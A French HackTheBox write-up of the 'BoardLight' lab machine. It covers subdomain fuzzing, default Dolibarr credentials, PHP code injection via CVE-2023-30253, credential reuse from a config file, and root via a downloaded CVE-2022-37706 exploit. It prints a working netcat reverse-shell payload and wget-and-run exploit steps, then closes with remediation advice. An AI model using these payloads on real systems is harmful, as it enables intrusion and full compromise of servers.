---
layout: post
title: "BoardLight - HackTheBox WriteUp"
date: 2024-04-15
categories: [CTF, HackTheBox, WriteUp]
tags: [WebApp, CMS, Dolibarr, CVE-2023-30253, PrivEsc, SUID, CVE-2022-37706, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: fr
permalink: /fr/blog/2024/04/15/boardlight-htb-writeup/
excerpt: "Machine Linux exposant une instance Dolibarr 17.0.0 vulnérable. Exploitation CVE-2023-30253 pour RCE, puis escalade de privilèges via SUID Enlightenment (CVE-2022-37706)."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-8 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>BoardLight
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                Exploitation Dolibarr 17.0.0 + SUID Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
        <div class="flex items-center gap-2">
            <i class="fas fa-calendar text-green-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">15/04/2024</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-network-wired text-blue-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">IP Target</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">10.10.11.11</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-shield-alt text-purple-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">Ubuntu 20.04</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-star text-amber-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**BoardLight** est une machine <span class="text-highlight-green">**Linux de difficulté facile**</span> qui expose une instance <span class="text-highlight-red">**Dolibarr 17.0.0**</span> vulnérable à la faille <span class="text-highlight-orange">**CVE-2023-30253**</span>.

L'exploitation de cette vulnérabilité permet d'obtenir un <span class="text-highlight-blue">**accès initial**</span> en tant qu'utilisateur web `www-data`. L'énumération du système révèle des <span class="text-highlight-red">**credentials en clair**</span> dans le fichier de configuration Dolibarr, permettant une connexion SSH avec l'utilisateur `larissa`. Enfin, l'escalade de privilèges se fait via l'exploitation du binaire <span class="text-highlight-purple">**SUID Enlightenment**</span> affecté par <span class="text-highlight-orange">**CVE-2022-37706**</span>, conduisant à un <span class="text-highlight-green">**shell root**</span>.

<div class="grid md:grid-cols-2 gap-6 my-10">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Compétences requises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Commandes Linux de base</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Énumération web et virtual hosts</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Analyse des permissions sous Linux</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Lecture de code source PHP</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Compétences acquises
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation Dolibarr (CVE-2023-30253)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Élévation de privilèges via SUID (CVE-2022-37706)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Fuzzing de sous-domaines avec ffuf</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Énumération automatisée avec LinPEAS</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Reconnaissance réseau

### Scan de ports initial

On commence par un scan rapide de tous les ports TCP pour identifier les services exposés :

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11
```

### Énumération détaillée des services

Une fois les ports ouverts identifiés, on effectue un scan approfondi avec détection de version et scripts NSE :

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.11
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Résultats du scan
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Service d'administration à distance sécurisé</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.41 ((Ubuntu))</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Serveur web hébergeant l'application cible</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Point d'entrée identifié :</strong> Le service web sur le port 80 constitue le vecteur d'attaque initial le plus probable.
    </p>
</div>


## 🌐 Phase 2 — Énumération web et virtual hosts

### Découverte du domaine principal

En visitant `http://10.10.11.11`, on observe dans le footer du site la référence au domaine `board.htb`. On l'ajoute à notre fichier de résolution DNS local :

```bash
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

### Fuzzing des sous-domaines

Le fuzzing du header `Host` permet de découvrir des virtual hosts additionnels hébergés sur le même serveur :

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://board.htb/ \
     -H 'Host: FUZZ.board.htb' \
     -fs 15949
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Sous-domaine découvert :</strong> <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono">crm.board.htb</code>
    </p>
</div>

On ajoute ce nouveau sous-domaine à `/etc/hosts` :

```bash
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Technique clé :</strong> Le fuzzing du header <code>Host</code> est une méthode d'énumération essentielle pour découvrir des virtual hosts non répertoriés dans les enregistrements DNS publics.
    </p>
</div>

## 💼 Phase 3 — Initial Access via Dolibarr

### Identification de l'application

En accédant à `http://crm.board.htb/`, on découvre une interface d'authentification **Dolibarr ERP/CRM**.

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <div class="flex items-center gap-4 mb-4">
        <div class="text-4xl text-blue-500">
            <i class="fas fa-building"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">Dolibarr ERP/CRM</h4>
            <p class="text-gray-600 dark:text-gray-400">Version 17.0.0</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        Dolibarr est un logiciel open-source de gestion d'entreprise (ERP/CRM) largement utilisé par les PME.
    </p>
</div>

### Authentification par défaut

Tentative de connexion avec les credentials par défaut :

```bash
Username: admin
Password: admin
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-unlock mr-2 text-green-500"></i>
        <strong>Authentification réussie !</strong> Les identifiants par défaut n'ont jamais été modifiés.
    </p>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Mauvaise pratique :</strong> Le maintien des credentials par défaut constitue une vulnérabilité critique facilement exploitable.
    </p>
</div>

## ⚙️ Phase 4 — Exploitation CVE-2023-30253

### Analyse de la vulnérabilité

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2023-30253 - PHP Code Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Versions affectées :</span> Dolibarr &lt; 17.0.1
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type :</span> Remote Code Execution (RCE)
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Prérequis :</span> Authentification requise
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score :</span> 8.8 (High)
            </div>
        </div>
        <p class="mt-4 p-3 bg-red-100 dark:bg-red-800/30 rounded">
            <strong>Description :</strong> Le filtre de sécurité bloque uniquement la syntaxe <code class="bg-red-200 dark:bg-red-900 px-1 rounded">&lt;?php</code> (minuscule), permettant l'injection de code PHP via <code class="bg-red-200 dark:bg-red-900 px-1 rounded">&lt;?PHP</code> (majuscule).
        </p>
    </div>
</div>

### Preuve de concept (PoC)

**Étapes d'exploitation :**

1. **Navigation :** Website → Create New Website
2. **Création d'une page web** dans l'éditeur Dolibarr
3. **Édition du source HTML** de la page
4. **Injection du payload PHP :**

```php
<?PHP echo system("whoami"); ?>
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Résultat :</strong> Le code s'exécute avec les privilèges de l'utilisateur <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded">www-data</code>
    </p>
</div>

### Obtention d'un reverse shell

**Configuration du listener sur la machine attaquante :**

```bash
nc -lnvp 4455
```

**Injection du payload reverse shell dans l'éditeur Dolibarr :**

```php
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f"); ?>
```

**Déclenchement du payload :** Accéder à la page créée via le navigateur

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Shell obtenu en tant que www-data !
    </p>
</div>

## 🔧 Phase 5 — Stabilisation du shell et énumération

### Amélioration du shell

Le shell initial obtenu est instable et limité. On le stabilise avec Python :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 160
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Tip :</strong> Cette technique permet d'obtenir un shell interactif complet avec historique des commandes et auto-complétion.
    </p>
</div>

### Énumération des fichiers de configuration

Les applications web stockent souvent des credentials dans leurs fichiers de configuration. On examine le fichier de configuration Dolibarr :

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
    <h4 class="text-xl font-bold mb-4 text-green-600 dark:text-green-400 flex items-center">
        <i class="fas fa-key mr-2"></i>Credentials découverts
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm">
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_user</span>=<span class="text-green-600 dark:text-green-400">'dolibarrowner'</span>;<br>
            <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_pass</span>=<span class="text-green-600 dark:text-green-400">'serverfun2$2023!!'</span>;
        </div>
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Credentials en clair trouvés !</strong> Ces identifiants sont potentiellement réutilisés ailleurs sur le système.
    </p>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Technique :</strong> Les fichiers de configuration d'applications web sont une mine d'or pour le pivoting — ils contiennent souvent des credentials valides réutilisés sur le système.
    </p>
</div>

## 🔐 Phase 6 — Accès SSH et user flag

### Identification des utilisateurs système

On vérifie la présence d'utilisateurs sur le système :

```bash
cat /etc/passwd | grep -E '/home|/bin/bash'
```

L'utilisateur `larissa` est identifié avec un shell bash actif.

### Connexion SSH

Tentative de connexion SSH avec le mot de passe découvert :

```bash
ssh larissa@board.htb
```

**Mot de passe :** `serverfun2$2023!!`

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        Connexion SSH réussie !
    </p>
</div>

### Validation de l'accès

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
    </div>
</div>

### Récupération du user flag

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>User flag obtenu !</strong> Première étape complétée.
    </p>
</div>

## 🔍 Phase 7 — Énumération locale avec LinPEAS

### Déploiement de LinPEAS

LinPEAS (Linux Privilege Escalation Awesome Script) est un outil d'énumération automatisé qui identifie les vecteurs d'escalade de privilèges.

**Téléchargement sur la machine cible :**

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

**Exécution :**

```bash
./linpeas.sh
```

### Analyse des résultats

LinPEAS identifie plusieurs binaires SUID intéressants :

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-red-600 dark:text-red-400 flex items-center">
        <i class="fas fa-exclamation-triangle mr-2"></i>Binaires SUID suspects détectés
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm space-y-2">
        <div class="text-red-600 dark:text-red-400">
            -rwsr-xr-x 1 root root 27K /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
        </div>
        <div class="text-amber-600 dark:text-amber-400">
            -rwsr-xr-x 1 root root 15K /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
        </div>
    </div>
</div>

<div class="bg-red-100 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4 rounded-r-lg">
    <p class="text-red-800 dark:text-red-200">
        <i class="fas fa-search mr-2 text-red-500"></i>
        <strong>Vecteur d'escalade identifié :</strong> Le binaire <code class="bg-red-200 dark:bg-red-800 px-2 py-1 rounded">enlightenment_sys</code> présente trois caractéristiques suspectes :
    </p>
    <ul class="mt-3 ml-6 space-y-1 text-red-700 dark:text-red-300">
        <li><strong>SUID bit activé</strong> → s'exécute avec les privilèges root</li>
        <li><strong>Binaire non standard</strong> → potentiellement vulnérable</li>
        <li><strong>Version inconnue</strong> → nécessite une vérification CVE</li>
    </ul>
</div>

## 👑 Phase 8 — Escalade de privilèges via CVE-2022-37706

### Analyse de la vulnérabilité

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2022-37706 - Enlightenment Path Traversal
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Versions affectées :</span> Enlightenment &lt; 0.25.4
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type :</span> Local Privilege Escalation
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Version installée :</span> 0.23.1
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score :</span> 7.8 (High)
            </div>
        </div>
        <p class="mt-4 p-3 bg-red-100 dark:bg-red-800/30 rounded">
            <strong>Description :</strong> Le binaire <code>enlightenment_sys</code> gère incorrectement les chemins commençant par <code>/dev/..</code>, permettant une traversée de répertoires et l'exécution de commandes avec les privilèges root.
        </p>
    </div>
</div>

### Exploitation

**Préparation de l'exploit sur la machine attaquante :**

```bash
# Télécharger l'exploit depuis GitHub
wget https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/raw/main/exploit.sh

# Héberger un serveur HTTP
python3 -m http.server 8000
```

**Téléchargement et exécution sur la cible :**

```bash
# Télécharger l'exploit
wget http://10.10.14.41:8000/exploit.sh

# Rendre l'exploit exécutable
chmod +x exploit.sh

# Lancer l'exploitation
./exploit.sh
```

### Résultat de l'exploitation

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-green-600 dark:text-green-400">
        [+] Vulnerable SUID binary found!<br>
        [+] Trying to pop a root shell!<br>
        [+] Enjoy the root shell :)
    </div>
</div>

**Vérification des privilèges :**

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        ROOT SHELL OBTENU ! Privilèges maximum atteints.
    </p>
</div>

## 🏁 Phase 9 — Extraction des flags

### Récupération du root flag

Avec les privilèges root, on peut maintenant accéder au flag final :

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned !</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> /home/larissa/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>

## 🛡️ Phase 10 — Recommandations et remédiations

### Mesures correctives par catégorie

<div class="grid md:grid-cols-2 gap-6 my-8">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-t-4 border-red-500">
        <h4 class="font-bold text-red-600 dark:text-red-400 text-xl mb-4 flex items-center">
            <i class="fas fa-shield-alt mr-2"></i>Niveau Application
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-arrow-up text-green-500 mt-1"></i>
                <span><strong>Mise à jour Dolibarr</strong> vers la version ≥ 17.0.1 pour corriger CVE-2023-30253</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-key text-amber-500 mt-1"></i>
                <span><strong>Changer les credentials par défaut</strong> immédiatement après l'installation</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-lock text-blue-500 mt-1"></i>
                <span><strong>Chiffrer les credentials</strong> dans les fichiers de configuration</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-user-shield text-purple-500 mt-1"></i>
                <span><strong>Implémenter une politique de mots de passe forte</strong> et rotation régulière</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-t-4 border-blue-500">
        <h4 class="font-bold text-blue-600 dark:text-blue-400 text-xl mb-4 flex items-center">
            <i class="fas fa-server mr-2"></i>Niveau Système
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-arrow-up text-green-500 mt-1"></i>
                <span><strong>Mettre à jour Enlightenment</strong> vers la version ≥ 0.25.4 pour corriger CVE-2022-37706</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-search text-amber-500 mt-1"></i>
                <span><strong>Auditer les binaires SUID</strong> régulièrement avec <code>find / -perm -4000 2>/dev/null</code></span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-lock text-red-500 mt-1"></i>
                <span><strong>Durcir SSH</strong> : désactiver l'authentification par mot de passe, utiliser uniquement des clés</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-chart-line text-purple-500 mt-1"></i>
                <span><strong>Surveiller les logs</strong> avec un SIEM pour détecter les activités suspectes</span>
            </li>
        </ul>
    </div>
</div>

## 📋 Récapitulatif des commandes

### 🔍 Phase 1 : Reconnaissance réseau

```bash
# 1. Scan rapide de tous les ports
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11

# 2. Scan détaillé des ports ouverts
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.11
# → Ports 22 (SSH) et 80 (HTTP) ouverts
```

### 🌐 Phase 2 : Énumération web

```bash
# 1. Configuration DNS
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts

# 2. Fuzzing de sous-domaines (Host header)
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
# → Découverte de crm.board.htb

# 3. Ajouter le sous-domaine
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

### 💥 Phase 3 : Exploitation Dolibarr (CVE-2023-30253)

```bash
# 1. Démarrer un listener pour le reverse shell
nc -lnvp 4455

# 2. Exploitation via le site ou outil automatique
# → Obtention d'un shell www-data

# 3. Stabilisation du shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# (Ctrl+Z puis)
stty raw -echo; fg
stty rows 38 columns 160
```

### 🔑 Phase 4 : Pivoting vers larissa

```bash
# 1. Récupération des credentials dans la config Dolibarr
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
# → Trouve le mot de passe MySQL : serverfun2$2023!!

# 2. Test de réutilisation du mot de passe pour SSH
ssh larissa@board.htb
# Password: serverfun2$2023!!
# → Connexion réussie !

# 3. Récupération du user flag
cat ~/user.txt
```

### 🔍 Phase 5 : Énumération système

```bash
# 1. Téléchargement de LinPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# 2. Exécution de LinPEAS
chmod +x linpeas.sh
./linpeas.sh
# → Identifie la version vulnérable d'enlightenment (CVE-2022-37706)
```

### 👑 Phase 6 : Escalade de privilèges (CVE-2022-37706)

```bash
# 1. Sur la machine attaquante : servir l'exploit
python3 -m http.server 8000

# 2. Sur la cible : télécharger l'exploit
wget http://10.10.14.41:8000/exploit.sh
chmod +x exploit.sh

# 3. Exécuter l'exploit
./exploit.sh
# → SUID shell root obtenu !

# 4. Récupération du root flag
cat /root/root.txt
```

---

## 📊 Chaîne d'attaque résumée

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-8">
    <div class="flex flex-col space-y-4">
        <div class="flex items-center gap-4">
            <div class="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold">1</div>
            <div class="flex-1">
                <div class="font-bold text-gray-800 dark:text-gray-200">Reconnaissance</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Scan Nmap → Ports 22, 80 ouverts</div>
            </div>
        </div>
        <div class="flex items-center gap-4">
            <div class="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center text-white font-bold">2</div>
            <div class="flex-1">
                <div class="font-bold text-gray-800 dark:text-gray-200">Énumération web</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Fuzzing → Découverte de crm.board.htb</div>
            </div>
        </div>
        <div class="flex items-center gap-4">
            <div class="w-12 h-12 bg-amber-500 rounded-full flex items-center justify-center text-white font-bold">3</div>
            <div class="flex-1">
                <div class="font-bold text-gray-800 dark:text-gray-200">Initial Access</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Credentials par défaut → Exploitation CVE-2023-30253 → RCE</div>
            </div>
        </div>
        <div class="flex items-center gap-4">
            <div class="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center text-white font-bold">4</div>
            <div class="flex-1">
                <div class="font-bold text-gray-800 dark:text-gray-200">Pivoting</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Credentials en clair → Accès SSH larissa</div>
            </div>
        </div>
        <div class="flex items-center gap-4">
            <div class="w-12 h-12 bg-red-500 rounded-full flex items-center justify-center text-white font-bold">5</div>
            <div class="flex-1">
                <div class="font-bold text-gray-800 dark:text-gray-200">Privilege Escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2022-37706 → SUID Enlightenment → Root shell</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & Références

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WebApp</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CMS</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Dolibarr</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2023-30253</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SUID</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2022-37706</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

